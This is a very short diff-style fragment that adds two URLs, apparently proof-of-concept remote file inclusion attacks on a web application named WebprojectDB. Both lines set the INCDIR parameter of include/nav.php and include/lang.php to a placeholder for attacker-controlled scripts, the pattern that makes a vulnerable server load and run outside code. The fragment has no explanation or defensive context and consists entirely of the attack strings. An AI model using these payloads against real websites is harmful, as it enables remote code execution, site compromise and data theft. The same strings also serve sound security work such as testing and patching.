@@ -1,0 +1,2 @@
+http://www.example.com/[WebprojectDB_path]/include/nav.php?INCDIR=[evil_scripts]
+http://www.example.com/[WebprojectDB_path]/include/lang.php?INCDIR=[evil_scripts]
